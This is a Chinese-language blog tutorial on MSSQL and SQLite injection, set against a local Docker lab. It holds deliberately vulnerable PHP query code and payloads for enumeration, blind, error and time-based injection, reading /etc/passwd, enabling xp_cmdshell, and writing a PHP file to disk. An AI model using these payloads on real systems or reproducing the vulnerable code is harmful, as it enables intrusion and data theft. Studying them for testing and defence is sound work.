---
layout:     post
title:      Mssql 与 Sqlite 注入
subtitle:   先简单记录一下 注入方式，以后慢慢补充
date:       2020-07-23
author:     BY Diego
header-img: /img/wenzhang/post-bg-sql注入.jpg
catalog: true
tags:
    - 数据库
    - SQL
---

# 一、Mssql

内置库
```
master   //用于记录所有SQL Server系统级别的信息，这些信息用于控制用户数据库和数据操作。
model    //SQL Server为用户数据库提供的样板，新的用户数据库都以model数据库为基础
msdb     //由 Enterprise Manager和Agent使用，记录着任务计划信息、事件处理信息、数据备份及恢复信息、警告及异常信息。
tempdb   //它为临时表和其他临时工作提供了一个存储区。
```

## (1) 测试环境

[Microsoft SQL Server](https://hub.docker.com/_/microsoft-mssql-server)

docker 创建mssql 服务

```
docker run -e 'ACCEPT_EULA=Y' -e 'SA_PASSWORD=yourStrong(!)Password' -e 'MSSQL_PID=Express' -p 1433:1433 -d microsoft/mssql-server-linux
docker exec -it <container_id|container_name> /opt/mssql-tools/bin/sqlcmd -S localhost -U sa -P <your_password>
```

php 连接（php 5低版本）
```php
<?php
 $server ="***"; //服务器IP地址,如果是本地，可以写成localhost
 $uid ="sa"; //用户名
 $pwd ="**"; //密码
 $database ="test"; //数据库名称

////进行数据库连接
 $conn =mssql_connect($server,$uid,$pwd) or die ("connect failed");
 mssql_select_db($database,$conn);

////执行查询语句
$name = isset($_GET['name'])?$_GET['name']:"admin";

$query ="select * from users where name = '$name'";
$row =mssql_query($query);

////打印输出查询结果
 while($list=mssql_fetch_array($row))
 {
    print_r($list);
    echo "<br>";
 }
?>
```
## (2) 基础SQL 注入

mssql 总体与 mysql差不多，但很多细节不同，没有`show`,`limit`,`group_concat`

```sql
select user
select @@version
select db_name()
```

查看权限

```sql
select IS_SRVROLEMEMBER('sysadmin')=1-- //sa
select IS_MEMBER('db_owner')=1-- // dbo
select IS_MEMBER('public')=1-- //public
```

查询所有数据库 ：
```sql
select name from master.dbo.sysdatabases;
```

查询用户表 ：
```sql
select  name from sysobjects where xtype='u'
```

由于缺少关键字没法把查询结果合并成一列，因此都采逐个查询方式

查询所有数据库
```sql
select top 1 name from master..sysdatabases where name not in (select top N name from master..sysdatabases order by name) order by name
```

![Uo7i1H.png](https://s1.ax1x.com/2020/07/21/Uo7i1H.png)

![Uo7Fcd.png](https://s1.ax1x.com/2020/07/21/Uo7Fcd.png)

查询所有表

```sql
select top 1  name from db..sysobjects where  xtype=char(85) and name not in (select top N name from db..sysobjects where xtype=char(85) )
```

查询字段
```sql
select top 1  COLUMN_NAME  from  test.information_schema.columns where TABLE_NAME='users' and COLUMN_NAME not in (select top N  COLUMN_NAME  from  test.information_schema.columns where TABLE_NAME='users')
```

## (3) 其他

### ① 堆叠注入
默认开启

### ② 读文件

读文件 与其他稍微有所不同，需要较高权限
```sql
1> create table readfile( context ntext)
2> BULK INSERT readfile FROM '/etc/passwd' WITH ( DATAFILETYPE = 'char', KEEPNULLS)
```

[![UobvBn.png](https://s1.ax1x.com/2020/07/21/UobvBn.png)](https://imgchr.com/i/UobvBn)

### ③ 报错注入

产生强制类型转化就行

暴库
```sql
and db_name()>0;--
```

爆表
```sql
and 1=(select top 1 name from sysobjects where xtype='u' ) --
```
爆列
```sql
 group by test.name having 1=1--
```
![UoXlgU.png](https://s1.ax1x.com/2020/07/21/UoXlgU.png)

### ④ declare 语句


```sql
declare @a nvarchar(200) set @a= 'select 1' exec(@a)
```


```sql
declare @a nvarchar(200) set @a=char(115)+char(101)+char(108)+char(101)+char(99)+char(116)+char(32)+char(49) exec(@a)
```

![UoOCy4.png](https://s1.ax1x.com/2020/07/21/UoOCy4.png)


### ⑤ 延时注入

```sql
select 1; waitfor delay '0:0:5';
```
### ⑥  命令执行
win 下
开启xp_cmdshell

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure'xp_cmdshell', 1;
RECONFIGURE;
```


关闭

```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure'xp_cmdshell', 0;
RECONFIGURE;
```

执行命令格式：
```sql
xp_cmdsehll('whoami');
```


# 二、Sqlite

php 连接sqlite 示例
需要php.ini 开起 对sqlite3的支持

```php
<?php
function sqlite_open($location)
 {
     $handle = new SQLite3($location);
     return $handle;
 }

function sqlite_query($dbhandle,$query)
 {
     $array['dbhandle'] = $dbhandle;
     $array['query'] = $query;
     $result = $dbhandle->query($query);
     return $result;
 }

function sqlite_fetch_array(&$result)
 {
     #Get Columns
     $i = 0;
     while ($result->columnName($i))
     {
         $columns[ ] = $result->columnName($i);
         $i++;
     }

     $resx = $result->fetchArray(SQLITE3_ASSOC);
     return $resx;
 }

$db = sqlite_open("sqlite.db");
$name = isset($_GET['name'])?$_GET['name']:"admin";
$query = sqlite_query($db,"select * from users where name = '$name'");
$res = sqlite_fetch_array($query);
var_dump($res);
?>

```
sqlite与其他数据库存储结构有所差异，以文件形式存在
![UqXdXV.png](https://s1.ax1x.com/2020/07/23/UqXdXV.png)

## (1) 基础语句

```sql
select sqlite_version();
```

查询所有表，不包含隐藏表`sqlite_maste`,存在`limit` 语法

```sql
SELECT group_concat(name) FROM sqlite_master WHERE type='table'
```

所有表结构(包含字段名，表名)
```sql
SELECT sql FROM sqlite_master WHERE type='table'
```

## (2) 其他注入

### ① 盲注

除去`and` ，`or` 还可用 `&` `|` , `||`在sqlite 里充当连接符 `&&`不可用
```sql
select * from test where id =1 and substr(sqlite_version(),1,1)='3'  
```

### ② 延时注入

```sql
select case when 1 then randomblob(100000000) else 0 end;
```
无if,注意调节数值大小



### ③ 写文件

前提可以堆叠注入，具有写权限
```sql
sqlite> attach database 'shell.php' as 'shell';
sqlite> create table shell.text(text varchar(300));
sqlite> insert into shell.text(text) values('<?php phpinfo();?>');
```
![ULK75Q.png](https://s1.ax1x.com/2020/07/23/ULK75Q.png)

![ULuW0U.png](https://s1.ax1x.com/2020/07/23/ULuW0U.png)
